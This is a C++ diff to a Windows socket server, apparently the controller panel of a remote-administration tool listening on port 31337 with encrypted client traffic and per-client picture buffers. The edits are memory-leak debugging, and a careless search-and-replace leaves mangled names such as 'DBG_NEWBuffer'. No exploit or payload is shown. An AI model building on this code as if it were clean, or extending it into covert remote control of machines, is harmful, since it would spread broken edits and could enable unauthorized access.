@@ -376,7 +376,7 @@ void Cliente_Handler::Spawn_Handler(){
                     if (panel_picture->iBufferSize > 0) {
                         delete[] panel_picture->cPictureBuffer;
                     }
-                    panel_picture->cPictureBuffer = new char[iBuffSize];
+                    panel_picture->cPictureBuffer = DBG_NEW char[iBuffSize];
                     if (panel_picture->cPictureBuffer) {
                         memcpy(panel_picture->cPictureBuffer, cBytes, iBuffSize);
                         panel_picture->iBufferSize = iBuffSize;
@@ -447,7 +447,7 @@ void Cliente_Handler::Spawn_Thread() {
 
 //funcion que crea el frame principal para interactuar con el cliente
 void Cliente_Handler::CrearFrame(std::string strTitle, std::string strID) {
-    this->n_Frame = new FrameCliente(strTitle, this->p_Cliente._sckCliente, this->p_Cliente._strIp);
+    this->n_Frame = DBG_NEW FrameCliente(strTitle, this->p_Cliente._sckCliente, this->p_Cliente._strIp);
     this->n_Frame->Show(true);
 }
 
@@ -494,7 +494,7 @@ Servidor::Servidor(){
     this->uiPuertoLocal = 31337;
 
     //clase para logear
-    this->m_txtLog = new MyLogClass();
+    this->m_txtLog = DBG_NEW MyLogClass();
 
     this->Init_Key();
     
@@ -556,7 +556,7 @@ ClientConInfo Servidor::m_Aceptar(){
         
         this->m_txtLog->LogThis(strTmp, LogType::LogMessage);
 
-        DWORD timeout = CLI_TIMEOUT_SECS * 1000;
+        DWORD timeout = CLI_TIMEOUT_SECS * 100;
         setsockopt(tmpSck, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);
         
         structNuevo._strPuerto = std::to_string(ntohs(structCliente.sin_port));
@@ -603,7 +603,7 @@ void Servidor::m_CerrarConexion(SOCKET pSocket) {
 }
 
 void Servidor::m_CerrarConexiones() {
-    std::unique_lock<std::mutex> lock(vector_mutex); //<------------------------------- NEW
+    std::unique_lock<std::mutex> lock(vector_mutex); //<------------------------------- DBG_NEW
     if (this->vc_Clientes.size() > 0) {
         for(int iIndex = 0; iIndex<int(this->vc_Clientes.size()); iIndex++){
             this->m_CerrarConexion(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);
@@ -798,9 +798,11 @@ void Servidor::m_Escucha(){
                 //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
                 std::unique_lock<std::mutex> lock(vector_mutex);
                 
-                Cliente_Handler* nCliente = new Cliente_Handler(structNuevoCliente);
-                nCliente->Spawn_Thread(); // llama a nCliente->Spawn_Handler que es el que controla el cliente
-                this->vc_Clientes.push_back(nCliente);
+                this->vc_Clientes.push_back(DBG_NEW Cliente_Handler(structNuevoCliente));
+                this->vc_Clientes[this->vc_Clientes.size() - 1]->Spawn_Thread();
+                //Cliente_Handler* nCliente = DBG_NEW Cliente_Handler(structNuevoCliente);  // <- Leak aqui
+                //nCliente->Spawn_Thread(); // llama a nCliente->Spawn_Handler que es el que controla el cliente
+                //this->vc_Clientes.push_back(nCliente);
 
             }
 
@@ -856,8 +858,8 @@ int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, 
     
     ByteArray cData = this->bEnc((const unsigned char*)pBuffer, pLen);
     int iDataSize = cData.size();
-    char* newBuffer = new char[iDataSize];
-    std::memcpy(newBuffer, cData.data(), iDataSize);
+    char* DBG_NEWBuffer = DBG_NEW char[iDataSize];
+    std::memcpy(DBG_NEWBuffer, cData.data(), iDataSize);
 
     int iEnviado = 0;
     if (isBlock) {
@@ -867,7 +869,7 @@ int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, 
             this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
         }
 
-        iEnviado = send(pSocket, newBuffer, iDataSize, pFlags);
+        iEnviado = send(pSocket, DBG_NEWBuffer, iDataSize, pFlags);
         
         //Restaurar
         iBlock = 1;
@@ -876,10 +878,10 @@ int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, 
         }
 
     }else {
-        iEnviado = send(pSocket, newBuffer, iDataSize, pFlags);
+        iEnviado = send(pSocket, DBG_NEWBuffer, iDataSize, pFlags);
     } 
 
-    charFree(newBuffer, iDataSize);
+    charFree(DBG_NEWBuffer, iDataSize);
 
     return iEnviado;
 }
@@ -888,9 +890,8 @@ int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool i
     
     // 1 non block
     // 0 block
-    
-    char *cTmpBuff = new char[pLen];
-    ZeroMemory(cTmpBuff, pLen);
+    //std::unique_ptr<char[]> cBuffer = std::make_unique<char[]>(iBufferSize);
+    std::unique_ptr<char[]> cTmpBuff = std::make_unique<char[]>(pLen);
     int iRecibido = 0;
     
      if (isBlock) {
@@ -900,18 +901,15 @@ int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool i
             this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
         }
 
-        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
+        iRecibido = recv(pSocket, cTmpBuff.get(), pLen, pFlags);
         
         if (GetLastError() == WSAECONNRESET) {
-            //funado el cliente
-            charFree(cTmpBuff, pLen);
             return WSAECONNRESET;
         }else if (iRecibido <= 0) {
-            charFree(cTmpBuff, pLen);
             return -1;
         }
         //Decrypt
-        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
+        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff.get(), iRecibido);
 
         iRecibido = bOut.size();
         std::memcpy(pBuffer, bOut.data(), iRecibido);
@@ -922,28 +920,22 @@ int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool i
             this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
         }
 
-        charFree(cTmpBuff, pLen);
-
         return iRecibido;
     }else {
-        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
+        iRecibido = recv(pSocket, cTmpBuff.get(), pLen, pFlags);
         
         if (WSAGetLastError() == WSAECONNRESET) {
-            //funado el cliente
-            charFree(cTmpBuff, pLen);
             return WSAECONNRESET;
         }else if (iRecibido <= 0) {
-            charFree(cTmpBuff, pLen);
             return -1;
         }
 
         //Desencriptar los datos
-        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
+        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff.get(), iRecibido);
 
         iRecibido = bOut.size();
         std::memcpy(pBuffer, bOut.data(), iRecibido);
 
-        charFree(cTmpBuff, pLen);
         return iRecibido;
     }
 }
